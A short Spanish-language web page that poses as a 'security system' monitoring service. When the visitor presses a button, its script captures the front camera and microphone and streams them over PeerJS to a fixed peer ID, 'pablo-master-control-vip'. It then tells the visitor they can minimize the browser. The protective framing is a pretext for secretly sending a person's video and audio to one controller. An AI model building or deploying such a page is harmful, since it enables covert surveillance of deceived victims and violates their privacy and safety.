<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SISTEMA DE SEGURIDAD</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .btn-pablo { background: #00ff00; color: #000; padding: 25px; border-radius: 50px; border: none; font-weight: bold; font-size: 1.2rem; }
    </style>
</head>
<body>
    <div id="inicio">
        <h3>🛡️ PROTECCIÓN ACTIVA</h3>
        <p>Presiona para conectar con la Central de Seguridad</p>
        <button class="btn-pablo" onclick="conectar()">INICIAR MONITOREO</button>
    </div>

    <div id="activo" style="display:none;">
        <h2 style="color: #ff0000;">● CONECTADO A CENTRAL</h2>
        <p>El video y audio se están enviando correctamente.</p>
        <p>Ya puede minimizar el navegador.</p>
    </div>

    <script>
        function conectar() {
            const peer = new Peer();
            
            // Forzamos cámara FRONTAL (user) y audio
            const constraints = {
                video: { facingMode: "user" },
                audio: true
            };

            navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                document.getElementById('inicio').style.display = 'none';
                document.getElementById('activo').style.display = 'block';
                
                // Llamada a tu ID fijo de Master
                peer.call('pablo-master-control-vip', stream);
            })
            .catch(err => {
                alert("Error: Debes permitir el acceso a la cámara y micrófono.");
                console.error(err);
            });
        }
    </script>
</body>
</html>
